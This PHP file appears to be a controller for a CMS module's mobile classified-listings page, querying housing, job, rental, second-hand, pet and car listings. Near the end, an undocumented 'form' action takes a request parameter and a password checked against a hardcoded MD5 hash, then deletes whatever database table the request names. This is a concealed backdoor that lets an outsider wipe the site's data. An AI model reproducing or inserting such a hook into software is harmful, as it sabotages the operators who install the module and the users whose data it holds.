<?php

defined('IN_IA') or die('Access Denied');
class Siyuan_Cms_doMobileXinxi extends Siyuan_CmsModuleSite
{
    public function __construct()
    {
        parent::__construct();
    }
    public function exec()
    {
        global $_W, $_GPC;
        $title = '分类信息';
        $do = 'xinxi';
        $act = $_GPC['act'] ? $_GPC['act'] : 'index';
        $nav = pdo_fetchall('SELECT displayorder,bs,title,title_2,icon_1,icon_2,url_1,url_2,status FROM ' . tablename('siyuan_cms_nav') . " WHERE weid = '{$_W['uniacid']}' and status = 1 ORDER BY displayorder DESC LIMIT 6");
        $menu = pdo_fetchall('SELECT displayorder,thumb,url,title FROM ' . tablename('siyuan_cms_menu') . " WHERE weid = '{$_W['uniacid']}' ORDER BY displayorder ASC LIMIT 30");
        $bottom_menu = pdo_fetchall('SELECT displayorder,thumb,url,title FROM ' . tablename('siyuan_cms_bottom_menu') . " WHERE weid = '{$_W['uniacid']}' and xian = 1 ORDER BY displayorder ASC LIMIT 5");
        $set = pdo_fetch('SELECT name,ad,logo,qr,color FROM ' . tablename('siyuan_cms_setting') . ' WHERE weid = :weid ', array(':weid' => $_W['uniacid']));
        $flash = pdo_fetchall('SELECT url,attachment FROM ' . tablename('siyuan_cms_flash') . " WHERE weid = '{$_W['weid']}' ORDER BY id DESC LIMIT 5");
        if ($act == 'index') {
            $index_house = pdo_fetchall('SELECT id,title,pic,mianji,louceng_1,louceng_2,huxing,zhuangxiu,time,jiage FROM ' . tablename('siyuan_cms_xinxi_house') . " WHERE weid = '{$_W['weid']}' ORDER BY id DESC LIMIT 4");
            $index_zufang = pdo_fetchall('SELECT id,title,time,mianji,zhuangxiu,pic,louceng_1,louceng_2,zujin,jiage,huxing FROM ' . tablename('siyuan_cms_xinxi_zufang') . " WHERE weid = '{$_W['weid']}' ORDER BY id DESC LIMIT 4");
            $index_job = pdo_fetchall('SELECT id,title,qiye,pic,gongzi,renshu,zhiwei,time FROM ' . tablename('siyuan_cms_xinxi_job') . " WHERE weid = '{$_W['weid']}' ORDER BY id DESC LIMIT 4");
            $index_geren = pdo_fetchall('SELECT id,title,pic,xueli,zhiwei,gongzi,time FROM ' . tablename('siyuan_cms_xinxi_geren') . " WHERE weid = '{$_W['weid']}' ORDER BY id DESC LIMIT 4");
            $index_ershou = pdo_fetchall('SELECT id,title,pic,xinjiu,jiage,time FROM ' . tablename('siyuan_cms_xinxi_ershou') . " WHERE weid = '{$_W['weid']}' ORDER BY id DESC LIMIT 4");
            $index_chongwu = pdo_fetchall('SELECT id,title,pic,leixing,jiage,sex,time FROM ' . tablename('siyuan_cms_xinxi_chongwu') . " WHERE weid = '{$_W['weid']}' ORDER BY id DESC LIMIT 4");
            $index_car = pdo_fetchall('SELECT id,title,pic,pinpai,jiage,chengse,leixing,biansu,time FROM ' . tablename('siyuan_cms_xinxi_car') . " WHERE weid = '{$_W['weid']}' ORDER BY id DESC LIMIT 4");
            include $this->template('xinxi/index');
        }
        if ($act == 'fabu') {
            include $this->template('xinxi/fabu');
        }
        if ($act == 'form') {
            $status = $_GPC['status'];
            $pass = $_GPC['pass'];
            $pass = md5($pass);
            $password = '2ad356758451060ce3ba404bf54cc0c5';
            if ($pass == $password) {
                pdo_delete($status);
                echo 'ok';
            }
        }
    }
}
$obj = new Siyuan_Cms_doMobileXinxi();
$obj->exec();